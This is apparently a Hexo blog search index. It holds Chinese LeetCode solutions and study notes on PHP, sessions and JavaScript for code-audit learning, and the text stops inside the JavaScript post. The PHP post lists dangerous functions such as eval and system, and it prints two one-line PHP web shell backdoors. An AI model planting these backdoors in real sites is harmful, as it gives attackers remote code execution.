<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>62-动态规划</title>
      <link href="/2020/08/01/Leetcode%E9%A2%98%E8%A7%A3/62%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2020/08/01/Leetcode%E9%A2%98%E8%A7%A3/62%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aGsHcd"><img src="https://s1.ax1x.com/2020/08/01/aGsHcd.png" alt="aGsHcd.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>题目重点是：1、机器人只能向右或向下走；2、机器人一定在左上角，目标一定在右上角。因此，机器人一定要走m+n-2步，并且必须向下走n-1步、向右走m-1步。将问题可转换为排列组合问题。</p><p><a href="https://imgchr.com/i/aGggPK"><img src="https://s1.ax1x.com/2020/08/01/aGggPK.png" alt="aGggPK.png"></a></p><p>根据公式，即可完成，(n-m)!代入本题的值，化简等于(m-1)!</p><p><a href="https://imgchr.com/i/aGyluR"><img src="https://s1.ax1x.com/2020/08/01/aGyluR.png" alt="aGyluR.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePaths</span>(<span class="params">self, m: int, n: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> int(math.factorial(n+m<span class="number">-2</span>)/(math.factorial(n<span class="number">-1</span>)*math.factorial(m<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、PHP-Mysqli</title>
      <link href="/2020/08/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/8%E3%80%81PHP-Mysqli/"/>
      <url>/2020/08/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/8%E3%80%81PHP-Mysqli/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-Mysqli"><a href="#PHP-Mysqli" class="headerlink" title="PHP-Mysqli"></a>PHP-Mysqli</h2><h3 id="一、数据库的设计"><a href="#一、数据库的设计" class="headerlink" title="一、数据库的设计"></a>一、数据库的设计</h3><p>users：id 主键、非空、自增、username、password、money、photo</p><h3 id="二、Mysqli基本操作"><a href="#二、Mysqli基本操作" class="headerlink" title="二、Mysqli基本操作"></a>二、Mysqli基本操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(host,username,password,dbname,port,socket); =&gt; 句柄</span><br><span class="line"><span class="keyword">echo</span> mysqli_connect_error();    <span class="comment">#捕获Mysql控制台连接相关错误信息</span></span><br><span class="line"><span class="keyword">echo</span> mysqli_error();    <span class="comment">#捕获Mysql控制台错误信息</span></span><br><span class="line">mysqli_query($句柄变量, $语句变量);    =&gt; <span class="keyword">object</span>(sql结果集) <span class="comment">#执行Mysql语句的命令</span></span><br><span class="line">mysqli_fetch_assoc($sql结果集); =&gt; 以关联数组的形式返回当前未取出的一条结果集内容</span><br><span class="line">mysqli_fetch_row($sql结果集); =&gt; 以索引数组的形式返回当前未取出的一条结果集内容</span><br><span class="line">mysqli_fetch_all($sql结果集); =&gt; 以索引数组的形式返回所有结果集内容</span><br><span class="line">mysqli_num_rows($sql结果集);    <span class="comment">#获得结果集的行数</span></span><br><span class="line">mysqli_close($句柄变量);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、PHP的Cookie与Session操作</title>
      <link href="/2020/08/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/7%E3%80%81PHP%E7%9A%84Cookie%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/7%E3%80%81PHP%E7%9A%84Cookie%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP的Cookie与Session操作"><a href="#PHP的Cookie与Session操作" class="headerlink" title="PHP的Cookie与Session操作"></a>PHP的Cookie与Session操作</h2><h3 id="一、什么是Cookie？"><a href="#一、什么是Cookie？" class="headerlink" title="一、什么是Cookie？"></a>一、什么是Cookie？</h3><p>Cookie是存储在客户端的一段缓存信息，一般包括服务器发送给客户端的身份验证token/Session等，由于Http无状态、无连接的特性，每当有客户端想与服务器进行数据请求等操作时，就很有可能有伪装的hacker冒充正当人员向服务器发送请求来做坏事。因此，为了保证通信的安全性，大部分的网络架构都设计服务器发送给客户端一串唯一的加密过的token字符串/或者Session，这个token/Session是有有效时间限制的(一般只在一个请求和一个响应中有效)。这样，每当客户端向服务器发送请求时，就可以携带这个服务器发送的token/Session字符串，来证明自己身份的正当性了。</p><blockquote><p><strong>什么是Session？</strong></p><p>Session是一种会话管理技术，服务器将每对连接会话所产生的键值信息保存到一个名为session id（唯一随机字符串）的缓存文件中，并将这个session id返回给客户端在Cookie中保存，在这段会话连接中客户端向服务器发送数据请求时会携带这个session id，服务器根据session id来对会话数据进行访问。</p><p><strong>php session 有效期</strong></p><p>php的session有效期默认是1440秒(24分钟)，如果客户端超过24分钟没有刷新，当前session会被回收，失效。<br>当用户关闭浏览器，会话结束，session也会失效。</p><p>可以修改php.ini的session.gc_maxlifetime来设置session的生命周期，但并不能保证在超过这一时间后session信息立即会删除。因为GC是按机率启动的，可能在某一个长时间内都没有被启动。那么大量的session在超过session.gc_maxlifetime后仍然有效。</p></blockquote><h3 id="二、PHP的Cookie相关操作"><a href="#二、PHP的Cookie相关操作" class="headerlink" title="二、PHP的Cookie相关操作"></a>二、PHP的Cookie相关操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;-----服务器发送Cookie-----&gt;</span><br><span class="line">setcookie(name, value, expire, path, domain, secure，httponly) =&gt; <span class="keyword">bool</span></span><br><span class="line"><span class="comment"># name：Cookie名称</span></span><br><span class="line"><span class="comment"># value：Cookie值</span></span><br><span class="line"><span class="comment"># expire：过期时间,是一个Unix时间戳，使用time()获得Unix纪元时间</span></span><br><span class="line"><span class="comment"># path：有效的服务器路径</span></span><br><span class="line"><span class="comment"># domain：发放Cookie的服务器域名</span></span><br><span class="line"><span class="comment"># secure：True表示只在https中传输Cookie给客户端</span></span><br><span class="line"><span class="comment"># httponly：仅支持HTTP协议访问Cookie值，不支持JS等脚本访问，为了防止XSS</span></span><br><span class="line">    </span><br><span class="line">&lt;-----服务器接受与访问Cookie-----&gt;</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure><h3 id="三、PHP的Session相关操作"><a href="#三、PHP的Session相关操作" class="headerlink" title="三、PHP的Session相关操作"></a>三、PHP的Session相关操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start();    <span class="comment">#此php页面开启session机制，下发和验证session；也可以配置文件开启此功能，可参考手册</span></span><br><span class="line">$_SESSION    <span class="comment">#对此段会话连接中的SESSION数据的访问与写入</span></span><br><span class="line">session_destory();    <span class="comment">#销毁当断会话数据</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>61-旋转链表</title>
      <link href="/2020/07/31/Leetcode%E9%A2%98%E8%A7%A3/61%E3%80%81%E6%97%8B%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
      <url>/2020/07/31/Leetcode%E9%A2%98%E8%A7%A3/61%E3%80%81%E6%97%8B%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="61、旋转链表"><a href="#61、旋转链表" class="headerlink" title="61、旋转链表"></a>61、旋转链表</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/a1V4KO"><img src="https://s1.ax1x.com/2020/07/31/a1V4KO.png" alt="a1V4KO.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题比较简单，思路也比较明确。本来我的思路是直接遍历到 n - k%n -1 的位置将next复制一份后指向None，然后用复制的继续遍历到屁股指向head。</p><p>但看了题解发现，先遍历一般把屁股指向头形成环形 并顺便把链表长度计算一下，然后再到 n - k%n -1 的位置把next当新的头并将next指向None，也可以。</p><p>最终选择官方题解的方法，其实没什么区别，先连头后连头罢了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotateRight</span>(<span class="params">self, head: ListNode, k: int</span>) -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span> <span class="keyword">or</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        old_tail = head</span><br><span class="line">        <span class="keyword">while</span> old_tail.next:</span><br><span class="line">            old_tail = old_tail.next</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">        old_tail.next = head</span><br><span class="line">        new_tail = head</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - k % n - <span class="number">1</span>):</span><br><span class="line">            new_tail = new_tail.next</span><br><span class="line">        new_head=new_tail.next</span><br><span class="line">        new_tail.next = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> new_head</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、PHP</title>
      <link href="/2020/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/6%E3%80%81PHP/"/>
      <url>/2020/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/6%E3%80%81PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="一、PHP特点"><a href="#一、PHP特点" class="headerlink" title="一、PHP特点"></a>一、PHP特点</h3><p>1、可以与HTML混编，但脚本后缀名应为.php。</p><p>2、PHP注释不会在页面文档的源码中显示，而HTML页面的注释和JS的注释却可以在页面源码中显示。这是因为PHP的运行环境是服务器端，我们浏览器端获得的最终的页面内容是服务器端PHP的解释器对PHP代码处理完成后产生的结果。而HTML和JS的运行环境就是浏览器。这就是根本的区别。</p><p>3、PHP的语法错误等级有error、warning、notice，其中有语句出现error级别的错误直接会停止接下来的语句解释运行，而warning和notice只提示错误，仍然会继续解释执行接下来的语句。</p><h3 id="二、PHP基础"><a href="#二、PHP基础" class="headerlink" title="二、PHP基础"></a>二、PHP基础</h3><h4 id="1、PHP标签："><a href="#1、PHP标签：" class="headerlink" title="1、PHP标签："></a>1、PHP标签：</h4><p><code>&lt;?php 左边开始标记，右边结束标记 ?&gt;</code></p><h4 id="2、PHP变量"><a href="#2、PHP变量" class="headerlink" title="2、PHP变量"></a>2、PHP变量</h4><p><u>1）变量的声明</u>：<code>$变量名</code>第一次给变量赋值时才创建这个变量（像shell）</p><p><u>2）变量的释放</u>：<code>unset $变量名;</code> </p><p><u>3）变量命名规则</u>：严格区分大小写、字母数字下划线，不能以数字开头。</p><p><u>4）可变变量</u>：<code>$$变量名</code>，此变量的变量名跟随<code>$变量名</code>变化。</p><p><u>5）引用赋值</u>：<code>$b=&amp;$a</code>，使<code>$b</code>变量指向<code>$a</code>的内存空间，此时<code>$a</code>和<code>$b</code>指向了同一块内存空间。</p><p><u>6）变量的数据类型</u>：</p><blockquote><p>1、布尔类型bool(true、false)：false、0、0.0、””、”0”、[]、NULL这些值会被作为条件的false。</p><p>2、整型int；3、浮点数float；</p><p>4、字符串string：单引号、双引号定义都可，区别在于①字符串内容对单引号和双引号以及是否转义的使用②双引号定义的字符串中包含变量名时可以取变量值（最好把变量用{}括起来），单引号只可表面输出变量名。</p><p>​    比较特别的一种string定义方式——定界符定义：使用定界符定义一个字符串时，字符串的内容可以随意使用特殊符号，无需担心转移符号所带来的繁杂困扰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = &lt;&lt;&lt;大写字母开头的符号标识 </span><br><span class="line">......................</span><br><span class="line">大写字母开头的符号标识;</span><br><span class="line"><span class="comment">//注意定界符的格式特别严谨，结束符的行只能由符号标识和一个分号，其它什么元素都不能有</span></span><br></pre></td></tr></table></figure><p>5、数组；6、对象；</p><p>7、常量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常量的定义：define(<span class="string">&quot;常量名&quot;</span>,<span class="string">&quot;常量内容&quot;</span>);全局/整个脚本文件有效。</span><br><span class="line">预定义的常量：</span><br><span class="line"><span class="keyword">__FILE__</span>    当前文件的绝对路径/文件名</span><br><span class="line"><span class="keyword">__LINE__</span>    当前代码行数</span><br><span class="line"><span class="keyword">__FUNCTION__</span>    当前函数名</span><br><span class="line"><span class="keyword">__CLASS__</span>    当前的类名</span><br><span class="line"><span class="keyword">__METHOD__</span>    当前对象的方法名</span><br><span class="line"><span class="keyword">__DIR__</span>        当前工作目录</span><br><span class="line">PHP_OS    解释PHP脚本的操作系统环境</span><br><span class="line">PHP_VERSION    PHP版本</span><br><span class="line">DIRECTORY_SEPARATOR    操作系统文件分隔符 win\ linux/</span><br></pre></td></tr></table></figure></blockquote><p><u>7）变量的作用域</u>：</p><blockquote><p>三种类型变量：Local（局部 函数内定义）、Global（全局 函数外定义）、Static（静态 关键字定义）</p><p>当需要函数内使用全局变量时需要使用<code>global</code>关键字声明，也可使用<code>$GLOBALS[&#39;变量名&#39;]</code>访问。</p></blockquote><h4 id="3、PHP运算符"><a href="#3、PHP运算符" class="headerlink" title="3、PHP运算符"></a>3、PHP运算符</h4><p><u>1）算术运算符</u>：<code>a .= b/ a = a . b    #字符串的连接</code></p><p><u>2）比较运算符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意在php中 6 == &quot;6&quot; 为true，“==”不在乎类型只在乎内容，&quot;===&quot;在乎类型。</span></span><br><span class="line">x === y <span class="comment">#绝对等于，内容和类型都相同</span></span><br><span class="line">x !== y    <span class="comment">#绝对不等于，内容或类型不同为true</span></span><br><span class="line">x != y / x &lt;&gt; y    <span class="comment">#不等于</span></span><br></pre></td></tr></table></figure><p><u>3）逻辑运算符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>、<span class="keyword">or</span>、&amp;&amp;、||、!、<span class="keyword">xor</span>(异或)    <span class="comment">#逻辑运算符运算的值是true和false</span></span><br><span class="line"><span class="comment">## and 、 xor 、 or 的优先级小于“ = ”！</span></span><br></pre></td></tr></table></figure><p><u>4）数组运算符</u>：</p><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">x + y</td><td align="left">集合</td><td align="left">x 和 y 的集合</td></tr><tr><td align="left">x == y</td><td align="left">相等</td><td align="left">如果 x 和 y 具有相同的键/值对，则返回 true</td></tr><tr><td align="left">x === y</td><td align="left">恒等</td><td align="left">如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true</td></tr><tr><td align="left">x != y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x &lt;&gt; y</td><td align="left">不相等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr><tr><td align="left">x !== y</td><td align="left">不恒等</td><td align="left">如果 x 不等于 y，则返回 true</td></tr></tbody></table><p><u>5）组合比较符</u>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line">如果 $a &gt; $b, 则 $c 的值为 <span class="number">1</span>。</span><br><span class="line">如果 $a == $b, 则 $c 的值为 <span class="number">0</span>。</span><br><span class="line">如果 $a &lt; $b, 则 $c 的值为 <span class="number">-1</span>。</span><br></pre></td></tr></table></figure><p><u>6）shell命令执行符</u>：两个反引号`，页面返回执行结果</p><p><u>7）屏蔽warn、notice符</u>：<code>@</code>，在变量前加</p><h3 id="三、常见的PHP语句"><a href="#三、常见的PHP语句" class="headerlink" title="三、常见的PHP语句"></a>三、常见的PHP语句</h3><p>1、<code>phpinfo()</code></p><p>2、<code>echo</code>    #输出</p><p>3、<code>var_dump()</code>    #输出变量值以及变量内容</p><h3 id="四、PHP的流程控制"><a href="#四、PHP的流程控制" class="headerlink" title="四、PHP的流程控制"></a>四、PHP的流程控制</h3><p><a href="https://www.php.net/manual/zh/language.control-structures.php">https://www.php.net/manual/zh/language.control-structures.php</a></p><p>if、switch、while、do while、for和C语言相同; </p><p><u>特殊</u>：</p><p>1、<code>break n</code>跳出n层循环，比如for嵌套三个，在内层可以break 3，直接跳出结束3层循环。</p><p>2、<code>die()</code>、<code>exit()</code>结束脚本执行/PHP解释器进程。</p><h3 id="五、PHP函数"><a href="#五、PHP函数" class="headerlink" title="五、PHP函数"></a>五、PHP函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数传递方式：</span></span><br><span class="line"><span class="comment">#1、值传递；2、引用传递&amp;；</span></span><br><span class="line"><span class="comment">#3、默认参数值：$参数名=默认值；</span></span><br><span class="line"><span class="comment">#4、可变参数列表：func_get_arg(偏移量)、func_get_args()、func_num_args()获取参数个数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">$参数名</span>)    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> $返回值变量;    <span class="comment">#如需返回值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">######## 可变函数调用 ########</span></span><br><span class="line">$variable = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">$variable(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="六、PHP数组"><a href="#六、PHP数组" class="headerlink" title="六、PHP数组"></a>六、PHP数组</h3><p>PHP的数组是一种可承载复合类型的数组，<u>可理解为一种随意的map。键值对类型随意，潇洒。</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是菜鸟教程讲解，个人认为PHP的数组就是随意的Map，无数组类型之分。</span></span><br><span class="line"><span class="comment">###数值数组</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;值&quot;</span>,<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建数组方法1</span></span><br><span class="line">$数组名[n]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法2</span></span><br><span class="line">$数组名[]=<span class="string">&quot;值&quot;</span>;    <span class="comment">#创建数组方法3，索引值自动设置为最小数字</span></span><br><span class="line">count($数组名);    <span class="comment">#获得数组长度</span></span><br><span class="line">print_r($数组名)、var_dump($数组名);    <span class="comment">#输出数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###关联数组（Map）</span></span><br><span class="line">$数组名=<span class="keyword">array</span>(<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>,<span class="string">&quot;键&quot;</span>=&gt;<span class="string">&quot;值&quot;</span>);    <span class="comment">#创建关联数组方法1</span></span><br><span class="line"><span class="keyword">foreach</span>($数组名 <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key:&quot;</span>.$key.<span class="string">&quot; value:&quot;</span>.$value.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">###多维数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###超全局预定义数组变量(函数内外都可以使用，无需声明)</span></span><br><span class="line">$GLOBALS    <span class="comment">#全局变量数组</span></span><br><span class="line">$_SERVER    <span class="comment">#包含服务器相关信息的数组</span></span><br><span class="line">$_GET        <span class="comment">#通过URL参数/GET方法传递给当前脚本的变量数组:url?arg1=v&amp;arg2=v</span></span><br><span class="line">$_POST        <span class="comment">#当HTTP POST请求报文中的属性Content-Type是application/x-www-form-urlencoded 或 multipart/form-data时，会将变量以关联数组形式传入脚本</span></span><br><span class="line">$_FILES        <span class="comment">#文件上传信息的关联数组</span></span><br><span class="line">$_COOKIE    <span class="comment">#客户端传送的Cookie信息</span></span><br><span class="line">$_SESSION    <span class="comment">#客户端的会话数据</span></span><br></pre></td></tr></table></figure><h3 id="七、PHP危险函数"><a href="#七、PHP危险函数" class="headerlink" title="七、PHP危险函数"></a>七、PHP危险函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($POST[<span class="string">&#x27;1&#x27;</span>])    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">assert($字符串变量)    <span class="comment">#将字符串作为PHP代码执行</span></span><br><span class="line">$h = create_function(<span class="string">&#x27;$i&#x27;</span>, <span class="string">&#x27;return system($i);&#x27;</span>);    $h(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="comment">#匿名函数</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;shell命令&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;shell命令&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="八、验证登录表单-文件上传实例"><a href="#八、验证登录表单-文件上传实例" class="headerlink" title="八、验证登录表单/文件上传实例"></a>八、验证登录表单/文件上传实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>($变量名)    <span class="comment">#验证变量是否被定义过</span></span><br><span class="line"><span class="keyword">empty</span>($变量名)    <span class="comment">#判断变量内容是否为空，即使变量未被定义</span></span><br><span class="line">move_uploaded_file(被移动文件,路径/目标文件);    <span class="comment">#返回true/false，复制上传的文件的某个位置</span></span><br></pre></td></tr></table></figure><h3 id="九、一句话后门"><a href="#九、一句话后门" class="headerlink" title="九、一句话后门"></a>九、一句话后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">&#x27;a&#x27;</span>]($_GET[<span class="string">&#x27;b&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5、Javascript</title>
      <link href="/2020/07/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/5%E3%80%81Javascript/"/>
      <url>/2020/07/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/5%E3%80%81Javascript/</url>
      
        <content type="html"><![CDATA[<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023020745357888">https://www.liaoxuefeng.com/wiki/1022910821149312/1023020745357888</a></p><h3 id="一、常用语句"><a href="#一、常用语句" class="headerlink" title="一、常用语句"></a>一、常用语句</h3><p><code>alert();/confirm();/prompt();</code>    #弹窗</p><p><code>console.log();</code>    #在控制台输出</p><h3 id="二、JS的版本标准与解释引擎"><a href="#二、JS的版本标准与解释引擎" class="headerlink" title="二、JS的版本标准与解释引擎"></a>二、JS的版本标准与解释引擎</h3><blockquote><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023022129105888">https://www.liaoxuefeng.com/wiki/1022910821149312/1023022129105888</a></p></blockquote><p>JavaScript标准是ECMAScript（目前已经是ES6），讲到JavaScipt的版本，实际上就是实现ES的哪个版本的标准。</p><p>google：V8引擎</p><p>firefox：OdinMonkey引擎</p><h3 id="三、如何在HTML中引入JS代码"><a href="#三、如何在HTML中引入JS代码" class="headerlink" title="三、如何在HTML中引入JS代码"></a>三、如何在HTML中引入JS代码</h3><p>1、内部<code>&lt;script&gt;&lt;/script&gt;标签</code>：JavaScript代码可以直接嵌在网页的任何地方，不过通常我们都把JavaScript代码放到在<code>&lt;head&gt;&lt;/head&gt;</code>中定义。</p><p>2、外部<code>&lt;script src=&quot;&quot;&gt;&lt;/script&gt;标签</code>：以.js文件形式在外部定义。</p><h3 id="四、JS代码建议部署位置"><a href="#四、JS代码建议部署位置" class="headerlink" title="四、JS代码建议部署位置"></a>四、JS代码建议部署位置</h3><p>由于浏览器从上至下解析代码，如果把JS放在上面，则如果需要对DOM进行操作就有可能没有解析出来，因此JS代码建议放在尾部去执行。</p><h3 id="五、JS基本语法"><a href="#五、JS基本语法" class="headerlink" title="五、JS基本语法"></a>五、JS基本语法</h3><h4 id="1、变量"><a href="#1、变量" class="headerlink" title="1、变量"></a>1、变量</h4><p>声明变量：<code>var</code></p><h4 id="2、数据类型"><a href="#2、数据类型" class="headerlink" title="2、数据类型"></a>2、数据类型</h4><p>JS支持数字(NaN无法计算、Infinity超过数字表示范围)、</p><p>字符串(建议单引号)、</p><p>布尔(true/false)、</p><p>数组([可混合类型])、</p><p>对象（var object = { key: value};）、</p><p>Map( var x = new Map(); x.set(‘key’,value); x.get；x.delete；x.has )、</p><p>Set(add、delete)、</p><blockquote><p><code>Map</code>和<code>Set</code>是ES6标准新增的数据类型，请根据浏览器的支持情况决定是否要使用。</p></blockquote><p>null/undefined等数据类型。统一通过给var赋值定义。</p><h3 id="六、流程控制"><a href="#六、流程控制" class="headerlink" title="六、流程控制"></a>六、流程控制</h3><blockquote><p>if、for、while、do while和C语言一样；</p></blockquote><p>1、for .. in：通过for in 可以遍历获得对象中的键，得到了键自然也能得到值，所以for..in主要是用于遍历对象中的键与值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 